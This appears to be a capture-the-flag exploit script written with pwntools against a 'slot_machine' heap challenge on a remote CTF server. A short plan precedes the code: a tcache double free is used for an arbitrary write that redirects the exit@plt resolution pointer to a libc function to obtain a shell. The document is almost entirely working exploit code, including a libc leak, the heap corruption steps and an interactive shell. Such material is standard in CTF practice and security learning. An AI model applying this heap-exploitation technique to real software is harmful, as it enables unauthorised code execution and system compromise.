'''
1. Free the tcache chunk on the heap to corrupt tcache linked list to give us an arbitrary write. This will use all our coins so we better make this write count.
2. Overwrite a pointer that the linker uses to find the address of exit in libc when calling exit@plt for the first time. Overwrite this pointer with the address we want to jump to -0x3a570 because exit is at offset +0x3a570 from this pointer.
3. Overwrite it with the address of maybe_execute_script() (yes this is really a function in libc)
4. Enjoy your shell
'''

from pwn import *

#r = process('./slot_machine')
r = remote('arcade.fluxfingers.net', 1815)

def malloc(size):
	r.sendafter('bye!\n', '1\n')
	r.sendafter('How much?\n', str(size) + '\n')

def free(offset):
	r.sendafter('bye!\n', '2\n')
	r.sendafter('where?\n', str(offset) + '\n')

def write(data):
	r.sendafter('bye!\n', '3\n')
	r.sendafter('what?\n', data)

libc = int(r.recvuntil('\nSelect your action!').split('\nSelect your action!')[0].split('Here is system : ')[1], 16) - 0x45380

log.success('Libc @ ' + hex(libc))

malloc(0x20) #initialize heap
free(-0x250)
free(-0x250)
malloc(0x240)
write(p64(libc + 0x1c4000)) #adress that plt uses to calculate the address of exit. this address might be different for different linkers but it should be around this address.
malloc(0x240)
malloc(0x240)
write(p64(libc + 0xc8f70 - 0x3a570)) #maybe_execute_script() -0x3a570 (offset to exit is +0x3a570)

r.interactive()
